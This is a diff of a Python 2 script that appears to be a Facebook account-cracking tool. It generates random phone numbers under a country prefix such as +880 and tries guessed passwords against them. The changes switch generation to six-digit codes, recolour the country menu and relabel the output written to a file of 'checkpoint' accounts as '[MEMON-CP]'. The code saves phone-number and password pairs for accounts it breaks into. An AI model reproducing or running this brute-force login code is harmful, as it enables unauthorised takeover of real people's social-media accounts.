@@ -5,9 +5,9 @@
 #Reserved2020
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(1000):
+for n in range(5000):
  
-    nmbr = random.randint(1111111, 9999999)
+    nmbr = random.randint(111111, 999999)
     
     sys.stdout = open('.txt', 'a')
  
@@ -71,22 +71,25 @@ id = []
 def menu():
 	os.system('clear')
 	print logo
-	print '[1]  Bangladesh'
-	print '[2]  USA'
-	print '[3]  UK'
-	print '[4]  India'
-	print '[5]  Brazil'
-	print '[6]  Japan'
-	print '[7]  Korea'
-	print '[8]  Italy'
-	print '[9]  Spain'
-	print '[10] Poland'
-	print '[11] Pakistan'
-	print '[12] Indonessia'
-	print '[13] Iran'
-	print '[14] Iraq'
-	print '[15] Saudi Arabia'
-	print '[16] Russia'
+	print "\033[1;93mSix (06) Code Generator"
+	print "\033[1;93mPassword Contain 06 digit"
+	print 
+	print "\033[1;93m[1]  Bangladesh"
+	print "\033[1;94m[2]  USA"
+	print "\033[1;95m[3]  UK"
+	print "\033[1;96m[4]  India"
+	print "\033[1;97m[5]  Brazil"
+	print "\033[1;98m[6]  Japan"
+	print "\033[1;37m[7]  Korea"
+	print "\033[1;38m[8]  Italy"
+	print "\033[1;39m[9]  Spain"
+	print "\033[1;92m[10] Poland"
+	print "\033[1;91m[11] Pakistan"
+	print "\033[1;98m[12] Indonessia"
+	print "\033[1;93m[13] Iran"
+	print "\033[1;94m[14] Iraq"
+	print "\033[1;96m[15] Saudi Arabia"
+	print "\033[1;97m[16] Russia"
 	print
 	print "[17] UPDATE COMMAND"
 #	print '[3] Follow Me On Facebook'
@@ -104,7 +107,7 @@ def action():
 		os.system("clear")
 		print (logo)
 		try:
-			c = raw_input(" choose code  : ")
+			c = raw_input(" SELECT CODE HERE: ")
 			k="+880"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
@@ -377,7 +380,7 @@ def action():
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '[CHECKPOINT] ' + k + c + user + ' | ' + pass1+'\n'
+					print '[MEMON-CP] ' + k + c + user + ' | ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
